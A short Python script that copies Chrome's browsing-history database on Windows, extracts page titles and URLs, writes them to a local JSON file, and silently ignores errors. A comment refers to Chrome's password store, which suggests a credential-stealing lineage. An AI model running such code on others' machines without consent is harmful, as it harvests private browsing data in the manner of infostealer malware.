import os
import json
import sqlite3
import shutil

history = []
history_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\History'

#making a temp copy since Login Data DB is locked while Chrome is running
shutil.copy2(history_db, "History_temp.db")
conn = sqlite3.connect("History_temp.db")
cursor = conn.cursor()

def get_history():
    try:
        rows = cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall()
        for row in rows:
            d = {}
            d['title'] = row[1]
            d['url'] = row[0]
            history.append(d)
    
        history_data = json.dumps(history)
        filename = "./Output/history.json"
        os.makedirs(os.path.dirname(filename), exist_ok=True)

        with open(filename, 'w') as f:
            f.write(history_data)
  
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("History_temp.db")
    except Exception as e:
        pass